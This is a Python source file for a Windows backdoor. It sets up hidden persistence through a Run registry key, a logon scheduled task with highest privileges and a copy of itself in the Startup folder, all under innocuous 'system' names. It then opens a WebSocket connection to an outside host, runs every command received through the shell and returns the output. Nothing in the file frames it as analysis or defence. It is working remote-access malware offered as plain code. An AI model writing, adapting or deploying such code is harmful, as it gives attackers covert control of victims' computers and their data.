import os
import sys
import winreg
import shutil
import socket
import subprocess
import requests
import ctypes
import json
import ssl
import time
from datetime import datetime, timedelta

def add_to_registry():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, "SystemService", 0, winreg.REG_SZ, sys.executable)
    except Exception:
        pass

def add_to_scheduler():
    try:
        task_name = "SystemMaintenance"
        schtasks_cmd = [
            'schtasks', '/create', '/tn', task_name, '/tr', sys.executable,
            '/sc', 'onlogon', '/rl', 'highest', '/f'
        ]
        subprocess.run(schtasks_cmd, capture_output=True)
    except Exception:
        pass

def add_to_startup():
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        target_path = os.path.join(startup_path, 'system_service.exe')
        if not os.path.exists(target_path):
            shutil.copyfile(sys.executable, target_path)
    except Exception:
        pass

def connect_to_websocket():
    server_url = "wss://lol-8jcf.onrender.com/ws"
    
    while True:
        try:
            import websocket
            ws = websocket.create_connection(server_url)
            
            while True:
                try:
                    command = ws.recv()
                    if not command:
                        break
                    
                    if command == 'exit':
                        break
                    
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                        output = result.stdout + result.stderr
                    except Exception as e:
                        output = str(e)
                    
                    ws.send(output)
                except Exception:
                    break
                    
        except Exception:
            time.sleep(30)

if __name__ == "__main__":
    add_to_registry()
    add_to_scheduler()
    add_to_startup()
    connect_to_websocket()